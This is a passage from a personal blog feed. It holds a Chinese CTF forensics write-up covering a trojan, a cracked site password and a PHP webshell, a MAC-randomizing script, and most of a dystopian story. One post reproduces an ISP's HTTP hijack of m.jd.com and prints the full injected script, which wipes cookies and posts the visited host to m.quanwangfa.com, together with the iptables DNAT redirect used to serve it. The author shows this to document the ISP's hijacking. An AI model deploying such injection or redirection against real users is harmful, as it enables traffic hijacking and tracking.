title="小利从黑客网站下载的文件名是什么？"></a>小利从黑客网站下载的文件名是什么？</h3><p>从上一题的分析就知道下载的文件名是<code>万能吃鸡助手.exe</code></p><h3 id="小利的网站后台密码是多少？"><a href="#小利的网站后台密码是多少？" class="headerlink" title="小利的网站后台密码是多少？"></a>小利的网站后台密码是多少？</h3><p>比赛的时候做到这题就没有思路了，一开始想到的是可能在流量中存在登录网站后台的的数据报文，所以筛选了一波post请求<br>在post请求中没有发现登录相关的流量，但是发现小利向黑客的网站上传了<code>Desktop.zip</code>文件。</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf3.png" alt=""></p><p>这个操作肯定不是小利自己进行的，所以猜测是小利下载并运行了从黑客网站上下载的木马文件。木马的操作就是将小利桌面的文件内容打包上传到黑客的网站。<br>所以将此文件导出。打开导出的.zip文件后发现没有内容</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf4.png" alt=""></p><p>用010editor打开文件也并没有发现zip头。然后就没有思路了。</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf5.png" alt=""></p><p>比赛结束之后找学长，学长提示后面的题目答案全在流量中提取出的压缩包内。<br>所以提取压缩包这个思路应该是对的，问题就出在压缩包文件内容上。<br>后来又仔细看了看文件内容，发现了这道题目中的坑。</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf6.png" alt=""></p><p>zip文件的文件头为<code>50 4B 03 04</code> ，而文件中的16进制的每一个字节的两个字符被反序了，所以导致了zip文件无法解析。<br>然后写脚本还原正确的文件</p><p>![]<a href="https://yygc.zzjnyyz.cn(/asset_files/2018-ynuctf7.png)" target="_blank" rel="noopener">https://yygc.zzjnyyz.cn(/asset_files/2018-ynuctf7.png)</a></p><p>还原之后打开文件：</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf8.png" alt=""></p><p>和之前的分析一样，木马程序的功能就是将小利桌面的文件打包并上传到黑客的网站。忽略所有的快捷方式，有效的信息只有三个，一个<code>joomla.rar</code>压缩文件，一个<code>Diary.docx</code>的word文档。一个<code>joomla.sql</code>数据库文件<br>很明显，joomla.rar压缩文件中就是小利网站的源码，<br>Joomla.sql文件就是小利网站的数据库文件。</p><p>而这道题目问的是小利的网站后台登录密码，很容易就能想到去数据库里面找。  </p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf9.png" alt=""></p><p>打开数据库查找<code>‘password’</code>关键字，在文件最后看到了user表，里面有password字段，而下面的语句向这个表里面插入了数据</p><p>对应一下就可以知道加密后的密码为<code>$2y$10$fOY7WmvLcJ2hpXaD0zZB4eZq/UoWqIkphuKvS2Eybymhu3HgZcmme</code><br>而密码解密的明文为woaini123，所以小利网站后台密码即为<code>woaini123</code></p><h3 id="小利的网站数据库密码是多少？"><a href="#小利的网站数据库密码是多少？" class="headerlink" title="小利的网站数据库密码是多少？"></a>小利的网站数据库密码是多少？</h3><p>数据库里面一般可以在网站的配置文件里面找到。<br>而这道题也是一样，直接去小利个人网站的网站配置文件里面就能看到数据库的用户名和密码都是<code>root</code></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf10.png" alt=""></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf11.png" alt=""></p><h3 id="小利的网站可以访问后台管理登陆页面的文件名是什么？"><a href="#小利的网站可以访问后台管理登陆页面的文件名是什么？" class="headerlink" title="小利的网站可以访问后台管理登陆页面的文件名是什么？"></a>小利的网站可以访问后台管理登陆页面的文件名是什么？</h3><p>这道题很明显，<code>xiaoli_admin.php</code></p><h3 id="小利的网站已存在的WebShell文件名是什么？"><a href="#小利的网站已存在的WebShell文件名是什么？" class="headerlink" title="小利的网站已存在的WebShell文件名是什么？"></a>小利的网站已存在的WebShell文件名是什么？</h3><p>这道题肯定不能一个一个去查看文件，所以直接下载一个D盾，对目录进行扫描</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf12.png" alt=""></p><p>直接找到Shell文件为<code>help.php</code></p><h3 id="若登陆WebShell成功时，Cookie值会被设置成多少？"><a href="#若登陆WebShell成功时，Cookie值会被设置成多少？" class="headerlink" title="若登陆WebShell成功时，Cookie值会被设置成多少？"></a>若登陆WebShell成功时，Cookie值会被设置成多少？</h3><p>找到D盾扫描出的WebShell文件</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf13.png" alt=""></p><p>通过文件内容的一些特征可以知道这是一个silic的php大马<br>直接定位到登录设置Cookie的函数</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf14.png" alt=""></p><p>如果Cookie等于设定的Cookie值，则登录成功，而这里的Cookie就是password这个变量的md5值。往上查找这个变量值</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf15.png" alt=""></p><p>MD5一下</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf16.png" alt=""></p><p>答案为<code>d6ef28a5a89d8ab0c803ef11c32eee34</code></p><h3 id="小利的爸爸称呼小利的妈妈什么？"><a href="#小利的爸爸称呼小利的妈妈什么？" class="headerlink" title="小利的爸爸称呼小利的妈妈什么？"></a>小利的爸爸称呼小利的妈妈什么？</h3><p>最后一题答案在日记中：</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf17.png" alt=""></p><p>这个笑话还挺好笑的</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Randomize MAC Address on Linux</title>
      <link href="/2018/Randomize-MAC-Address-on-Linux/"/>
      <url>/2018/Randomize-MAC-Address-on-Linux/</url>
      <content type="html"><![CDATA[<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Fuck dormmate! They watch the FIFA via speakers the whole night.<br>Disconnect their network should work. Or else, I have to buy a network channel filler.</p><h1 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h1><h2 id="Method-1-Use-the-Bash-Script"><a href="#Method-1-Use-the-Bash-Script" class="headerlink" title="Method 1: Use the Bash Script"></a>Method 1: Use the Bash Script</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>randmac<span class="token operator">=</span><span class="token punctuation">$(</span>echo 03:6a:2f:`openssl rand -hex 3 <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/\(..\)/\1:/g; s/.$//'</span>`<span class="token punctuation">)</span><span class="token function">sudo</span> <span class="token function">ifconfig</span> eth0 down<span class="token function">sudo</span> <span class="token function">ifconfig</span> eth0 hw ether <span class="token variable">$randmac</span><span class="token function">sudo</span> <span class="token function">ifconfig</span> eth0 up<span class="token keyword">exit</span> 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Method-2-Randomize-everytime-when-you-connect"><a href="#Method-2-Randomize-everytime-when-you-connect" class="headerlink" title="Method 2: Randomize everytime when you connect"></a>Method 2: Randomize everytime when you connect</h2><p>/etc/NetworkManager/conf.d/randmac.conf</p><pre><code>[device-mac-randomization]# &quot;yes&quot; is already the default for scanningwifi.scan-rand-mac-address=yes[connection-mac-randomization]# Randomize MAC for every ethernet connectionethernet.cloned-mac-address=random# Generate a random MAC for each WiFi and associate the two permanently.wifi.cloned-mac-address=random</code></pre>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Simple HTTP Hijacking</title>
      <link href="/2018/Simple-HTTP-Hijacking/"/>
      <url>/2018/Simple-HTTP-Hijacking/</url>
      <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>As a man heavily relies on network stablity, I connected to Internet via CT Network.</p><p>However, after experiencing the DNS response packet fully-filled with alphabet within two days, I experienced a HTTP JavaScript Hijacking again. This time, they hijacked <code>m.jd.com:80</code> . I reproduced this “feature” using my Arch Linux PC Chrome, iPad Safari, iPad Chrome again and again.</p><p>I will provide my packet capture files here.</p><p>DNS Capture:  <a href="https://yygc.zzjnyyz.cn/asset_files/udp53_filledNONSENSE.pcap" target="_blank" rel="noopener">PCAP File</a></p><p>Hijack Capture: <a href="https://yygc.zzjnyyz.cn/asset_files/jd_hijack_ipad.chls" target="_blank" rel="noopener">CHLS File - Charles Proxy</a></p><p>They still don’t admit it. And they asked me if they could go to my house and check it themselves. I accepted. However, the process of reproduction is tested under a very clear environment. Now, they set up a whitelist and want to cheat me.</p><p>I won’t accept any cheat. Now, I started to deploy a hijack by myself now.</p><h1 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h1><h2 id="Add-NAT-to-redirect-traffic"><a href="#Add-NAT-to-redirect-traffic" class="headerlink" title="Add NAT to redirect traffic"></a>Add NAT to redirect traffic</h2><blockquote><p><code>REDIRECT</code> alters the destination IP address to send to the machine itself. In other words, locally generated packets are mapped to the 127.0.0.1 address. It’s for redirecting local packets. If you only want to redirect the traffic between services on the local machine, it will be a good choice.</p></blockquote><blockquote><p><code>DNAT</code> is actual <a href="http://en.wikipedia.org/wiki/Network_address_translation" target="_blank" rel="noopener">Network Address Translation</a>. If you want packets destinated outside of the local system to have the destination altered, it’s the better choice of the two, as <code>REDIRECT</code> will not work.</p></blockquote><p>iptables Config</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># sysctl -w net.ipv4.ip_forward=1</span><span class="token comment" spellcheck="true"># iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT</span><span class="token comment" spellcheck="true"># iptables -t nat -A PREROUTING -p tcp -m tcp -s &lt;SOURCE IP> -d &lt;DESTINATION IP> -j DNAT --to-destination &lt;WEB SERVER IP>:&lt;PORT></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Caddy-for-listening-on-port-80"><a href="#Caddy-for-listening-on-port-80" class="headerlink" title="Caddy for listening on port 80"></a>Caddy for listening on port 80</h2><p>Caddy Config</p><pre><code>http://m.jd.com:80 {   timeouts none   log stdout   root /tmp/testweb}</code></pre><p>/tmp/testweb/index.html (File dumped from pcap file)</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">function</span> <span class="token function">qs</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>m<span class="token punctuation">,</span>v<span class="token punctuation">,</span>u<span class="token punctuation">)</span><span class="token punctuation">{</span>u<span class="token operator">=</span>u<span class="token operator">||</span>D<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">var</span> t<span class="token operator">=</span>u<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'/(\\?|#|&amp;)('</span><span class="token operator">+</span>n<span class="token operator">+</span><span class="token string">')=([^&amp;]*)(&amp;|$)/i'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span>m<span class="token operator">=</span>m<span class="token operator">||</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v<span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">||</span>v<span class="token punctuation">}</span><span class="token keyword">return</span> m<span class="token operator">&amp;&amp;</span>v<span class="token operator">?</span><span class="token string">'&amp;'</span><span class="token operator">+</span>m<span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>v<span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">fc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> h<span class="token operator">=</span>location<span class="token punctuation">.</span>host<span class="token punctuation">,</span>x<span class="token operator">=</span><span class="token string">'=;expires='</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUTCString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token operator">=</span>x<span class="token operator">+</span><span class="token string">';path='</span><span class="token punctuation">,</span>z<span class="token operator">=</span>y<span class="token operator">+</span><span class="token string">'/;domain='</span><span class="token punctuation">,</span>l<span class="token operator">=</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>y<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">,</span>z<span class="token operator">+</span>h<span class="token punctuation">,</span>z<span class="token operator">+</span>h<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>o<span class="token operator">=</span>D<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/[^ =;]+(?=\=)/g</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>o<span class="token operator">&amp;&amp;</span>S<span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span>o<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">)</span>D<span class="token punctuation">.</span>cookie<span class="token operator">=</span>o<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>l<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">)</span>localStorage<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">)</span>sessionStorage<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span>fc<span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">fip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> u<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'http://m.quanwangfa.com/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(\?|#)&amp;/g</span><span class="token punctuation">,</span><span class="token string">'$1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>D<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>D<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"javascript:var D=document;D.write(\"&lt;html>&lt;body>&lt;form method='post'action='"</span><span class="token operator">+</span>u<span class="token operator">+</span><span class="token string">"'>&lt;input name='t'value='"</span><span class="token operator">+</span>location<span class="token punctuation">.</span>host<span class="token operator">+</span><span class="token string">"'/>&lt;input name='p'value='0'/>&lt;input name='g'value='_top'/>&lt;input type='submit'id='s'/>&lt;/form>&lt;/body>&lt;/html>\");var s=D.getElementById('s');if (s.click) s.click();D.close()"</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">{</span>D<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token string">'home=s'</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">var</span> D<span class="token operator">=</span>document<span class="token punctuation">,</span>d<span class="token operator">=</span>D<span class="token punctuation">,</span>S<span class="token operator">=</span><span class="token operator">!</span>D<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/home=s/i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>D<span class="token punctuation">.</span>body<span class="token punctuation">.</span>style<span class="token punctuation">.</span>visibility<span class="token operator">=</span><span class="token string">'hidden'</span><span class="token punctuation">;</span>D<span class="token punctuation">.</span>oncontextmenu<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">fc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fip</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Done"><a href="#Done" class="headerlink" title="Done!"></a>Done!</h1><p>Tested. </p><p>Update: 2 weeks after I report to MIIT, still can be reproduced on my HUAWEI device.</p><h1 id="Referrence"><a href="#Referrence" class="headerlink" title="Referrence"></a>Referrence</h1><p><a href="https://serverfault.com/questions/179200/difference-beetween-dnat-and-redirect-in-iptables" target="_blank" rel="noopener">https://serverfault.com/questions/179200/difference-beetween-dnat-and-redirect-in-iptables</a><br><a href="http://xstarcd.github.io/wiki/Linux/iptables_forward_internetshare.html" target="_blank" rel="noopener">http://xstarcd.github.io/wiki/Linux/iptables_forward_internetshare.html</a><br><a href="https://my.oschina.net/tridays/blog/785483" target="_blank" rel="noopener">https://my.oschina.net/tridays/blog/785483</a></p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>The Silence City</title>
      <link href="/2018/The-Silence-City/"/>
      <url>/2018/The-Silence-City/</url>
      <content type="html"><![CDATA[<h1 id="Copyright-disclaimer"><a href="#Copyright-disclaimer" class="headerlink" title="Copyright disclaimer"></a>Copyright disclaimer</h1><blockquote><p>著作权归原作者所有。<br>转载自 <a href="https://diygod.me/1666/" target="_blank" rel="noopener">https://diygod.me/1666/</a></p></blockquote><h1 id="Content"><a href="#Content" class="headerlink" title="Content"></a>Content</h1><blockquote><p>马伯庸《寂静之城》未删节版本全文<br>发表在 2005 年第 5 期《科幻世界》上的本文由于众所周知的原因进行了删节,这是发在马伯庸 个人网站上的原文</p></blockquote><p>And in the naked light I saw ten thousand people, maybe more.<br>People talking without speaking, people hearing without listening.<br>People writing songs that voices never shared, no one dared disturb the sound of silence.</p><p>— The sound of silence</p><p>美利坚合众国,2015 年,纽约。</p><p>当电话响起来的时候,阿瓦登正趴在电脑前面睡觉。电话铃声十分急促,尖锐,每一次振动都让他的耳膜难受好久。他揉了揉干涩的眼睛十分不情愿地爬起来,觉得脑子沉滞无比。</p><p>其实他的脑子一直就很沉滞,这种感受既然是生理上的也是心理上的。他身处的房间很狭窄,空气不很好,唯一的两扇窗户紧闭着——即使打开窗户也 没用,外面的空气更加浑浊。这是一间大约只有三十平米的小屋子,屋子墙壁上泛黄的墙纸有好几处开始剥落,天花板上的水渍渗成奇怪的形状;一张老式的军绿色 行军床摆在墙角,床腿用白漆写着编号;紧挨着行军床的是一张三合板制成的电脑桌,桌上摆着一台浅白色的电脑,机箱后面五颜六色的电线纠缠在一起,把它们自己打成一个古怪的死结,杂乱无章地蔓延到地板与墙角,仿佛常春藤一样。</p><p>阿瓦登走到电话前,慢慢坐到地板上,目光呆滞地盯着电话,手却没有动。这部古怪的东西是老式的按键式电话,大概是十几年前的款式,这是阿瓦登有一次去费城出差时偶尔在一家杂货店里买到的;他拿回家以后稍微修理了一下,发现居然还能用,这让他当时小小地兴奋了一阵子。</p><p>电话继续在响着,已经是第七声。阿瓦登意识到自己不得不去接听了。于是他弓下腰,用两个指头拈起电话,慢慢把电话放到耳边。</p><p>“请说出你的网络编号?”话筒里传来的声音并不急噪,事实上它也不带其他任何的感情色彩,因为这是电脑合成的人工智能语音系统。</p><p>“19842015”</p><p>阿瓦登熟练地报出一连串数字,同时开始觉得胸有些更闷了。说实话他并不喜欢这些空洞的电子声音,他有时候想,假如打过电话来的一位声音圆润的女性该多好。阿瓦登知道这是一种不切实际的幻想,不过这幻想会让他的身体得到几秒钟的舒缓。</p><p>话筒里的声音仍旧在继续着。</p><p>“关于你在十月四日提交的网络论坛用户注册申请已经被受理,经有关部门审查后确认资格无误,请在三日内持本人身份证件、网络使用许可证及相关文件前往办理登记手续,并领取用户名及密码。”</p><p>“知道了,谢谢。”</p><p>阿瓦登谨慎地选择词语,同时努力挤出一副满足的微笑,好象话筒的另一侧有人在看着自己一样。放下电话,阿瓦登先是茫然地盯着它了大约两分钟,然后站起来活动一下手腕,坐回到电脑前面,缓慢地推动了一下鼠标。</p><p>电脑屏幕“啪”地一声亮了起来,显示出一个登陆的界面,还有一行英文:“请输入你的网络编号和姓名。”阿瓦登将那八位数字敲进去,又输入了自己的名字,点击“登陆”。随即机箱的指示灯开始频繁地闪动起来,整个机器发出细微的噪音。</p><p>每一个使用互联网的人都有一个网络编号,没有这个编号,就无法连接进互联网络。每一个编号都是独一无二的,每个人只有一个;这是使用者在网上的唯一代号,既不能修改,也不能取消。这些编号分别对应着使用者身份证上的名字,因此 19842015 就是阿瓦登,阿瓦登就是 19842015。阿瓦登知道有些记忆力不好的人会把自己的编号印在衣服的后面,那看起来颇为滑稽,也容易引发一些不正当的联想。</p><p>有关部门说使用网络实名制是为了规范网络秩序方便管理,杜绝因匿名使用网络而产生的一系列重大问题和混乱。阿瓦登不太清楚那一系列重大问题会 是什么,他自己没试过用假名上网,他所认识的任何人里也不曾有人尝试过——事实上,从技术角度来说,他根本没办法匿名登陆互联网络,没有编号就没有权限上网,而编号则连接着他的详细档案,换句话说,没人能在网上隐藏自己。有关部门把这一切都考虑的很周详。</p><p>“有关部门”,这是一个语意模糊、但却有着权威与震慑力的词组。它既是泛指,又是确指,其所涵盖的意义相当广泛。有时候,它指的是为阿瓦登颁 发网络编号的美国联邦网络管理委员会;有时候它是将最新通告及法规发到阿瓦登 EMAIL 信箱的服务器;还有时候它是监察网络的 FBI 特属网络调查科;总之一句话,有关部门是无处不在,无职不司的,总会在适当的时候出现,给予指导、监控或者警告,无论你是在网上还是网下。</p><p>简直就象是老大哥一样无微不至。</p><p>电脑仍旧在持续运转着,阿瓦登知道这得花上一阵子。这台电脑是有关部门配发给他的,具体型号和配置阿瓦登并不清楚,机箱是被焊死的,无法打开。于是他拿出一小瓶清凉油,用右手小拇指的指甲挑出一点抹在自己的太阳穴,然后从脚下堆积如山的杂物里翻出一个塑<br>料杯子,从桌子旁的饮水机里接了半杯蒸 馏水,就着一片镇痛片一饮而尽。蒸馏水穿过喉咙和狭长的食道滑进胃里,空泛的味道让他有些恶心。</p><p>音响里忽然传来一阵美国国歌的旋律,阿瓦登放下杯子,重新把目光投到电脑上去。这是已经连入互联网络的标志。屏幕上首先跳出来的是有关部门的通告,白底黑色四号字,里面陈述了使用互联网的意义以及最新的规章制度。</p><p>“缔造健康的互联网络,美国万岁!”</p><p>音响里传来激昂的男性呼声,阿瓦登不大情愿地跟着大声念了一遍。“缔造健康的互联网络,美国万岁!”</p><p>这段呼号持续了三十秒钟,然后消失,取而代之的是写着“缔造健康的互联网络”标语的桌面背景。另外一个窗口慢慢浮上开,上面开列出几个选项:工作、娱乐、电子信箱和BBS 论坛。其中 BBS 选项呈现灰色,说明这项功能还没有开通。</p><p>整个操作系统简洁明了,这台电脑的浏览器没有地址输入栏,只是在收藏夹里有几个无法修改的的网站地址。理由很简单,这些网站都是健康向上的, 假如其他站点和这些网站一样,那么只保留这些网站就够了;假如其他站点与这些网站不一样,那么就是不健康的,是低级趣味,不能保留。这是有关部门精心设计的,是为了公民的精神健康着想,生怕他们受到不良信息的侵染。</p><p>阿瓦登首先点开了“工作”,一连串和他工作相关的站点列表与相关软件在电脑上显示出来。阿瓦登是一名程序员,他每天的工作就是根据上级的要求编写程序。这份工作很无聊,不过可以保证他有稳定的收入。他不知道自己的源代码会被用到哪里去,上级也从来没有跟他说过。</p><p>他打算继续昨天的工作,但是很快发现自己很难继续下去。阿瓦登觉得今天的情绪比以前要烦躁,无法集中精神,大脑还是很呆滞,胸口仍旧发闷。他试图娱乐自己,但是他发现“娱乐”选项里只有纸牌与挖地雷,根据有关部门的说法,这是两个健康的游戏,没有暴力,没有色情,不会让人产生犯罪冲动,也不涉及任何政治色彩。据说美国境外也是有互联网络站点的,不过无法连上去,因为本国的互联网络自成格局,独立自主,普通人无法直接连接到国外——IE 浏览器没 有地址栏,就算知道地址也没有用处。</p><p>“您有一封新邮件。”</p><p>系统忽然跳出来提示,阿瓦登终于找到了可以暂停工作的理由,他很快移动鼠标到电子信箱的选项上,点开,很快一个新的界面出现了。</p><p>“To: 19842015<br>From:10045687<br>Subject: 模块、已经、完成、当前、项目、是否、开始。”</p><p>阿瓦登微微地叹了一口气,觉得有些失望。每一次他收到新的电子邮件,都希望能够有一次新鲜的刺激来撞击他日益迟钝的脑神经,每一次他都失望 了。其实他早就知道这一点,只不过他觉得保持期待至少能够享受到几秒钟快感。就好象他期待着打电话过来的是一个圆润温柔的女性声音一样。不给自己一些渺茫的希望,阿瓦登觉得自己迟早会疯掉的。</p><p>这封信很简短,但是内容很充实。19842015 是阿瓦登的网络编号,而 10045687 则是他的一位同事的编号,这种工作性质的信件通常都 以编号相称。信的内容是几个不连续的英文单词,这是有关部门所提倡的一种电子邮件书写方式,因为这样可以方便软件检查信件中是否含有敏感词汇。</p><p>阿瓦登打开回信的页面,同时另开了一个窗口,打开一份名字叫做“网络健康语言词汇列表”的 TXT 文档。这是有关部门要求每一位网民所必须使用的词汇。当他们书写电子邮件或者使用论坛服务的时候,都得从这个词汇列表中寻找适合的名词、形容词、副词或者动词来表达自己想要说的话。一旦过滤软件发现 网民使用了列表以外的词,那么这个词就会被自动屏蔽,取而代之的是“请使用健康语言”。</p><p>“屏蔽”是个专有名词,被屏蔽的词将不允许再度被使用,无论是在书信里还是口头都不允许。讽刺的是,“屏蔽”一词本身也是被屏蔽的词汇之一。</p><p>这个列表是经常更新的,每一次更新都会有几个词在列表上消失,于是阿瓦登不得不费劲脑汁寻找其他词语来代替那个被屏蔽掉的词语或者单字。比如在以前,“运动”这个词是可以使用的,但后来有关部门宣布这也是一个敏感词汇,阿瓦登只好使用“质点位移”来表达相同的意思。</p><p>他对照着这份列表,很快就完成了一封文字风格与来信差不多的 EMAIL——健康词汇表迫使人们不得不用最短的话来表达最多意思,而且要尽量减少不必要的修辞,所以这些信件就好象是那杯蒸馏水一样,淡而无味,阿瓦登有时候想,他早晚也会和这些水和信一样腐烂,因为这些信是他写的,水是他喝的。</p><p>接下来阿瓦登启动检查软件先扫了一遍,确保自己没无意中加入什么敏感词汇。等这一切都完成后,他按下了发送键,邮件被送出去了。</p><p>阿瓦登没有留下备份,因为他的机器里没有硬盘,也没有软驱、光驱或者 USB 接口。这个时代宽带技术已经得到了很大发展,应用软件可以集中在统一的一个服务器中,个人用户调用时的速度丝毫不会觉得迟滞。因此个人不需要硬盘,也不需要本地存储,他们在自己电脑里写的每一份文档、每一段程序、甚至每一个动作都会被自动传送到有关部门的公共服务器中,这样便于管理。换句话说,阿瓦登所使用的电脑,仅仅具备输入和输出两种功能。</p><p>完成了这封信后,阿瓦登再度陷入了软绵绵的焦躁状态,这是一个连续工作了三天的程序员的正常反应。这种情绪很危险,因为它让人效率低下精神低迷,而且没有渠道发泄。“疲劳”、“烦躁”以及其他负面词汇都属于危险词汇,如果他写信给别人抱怨的话,那么对方收到的将会是一封写满“请使用健康语言” 的 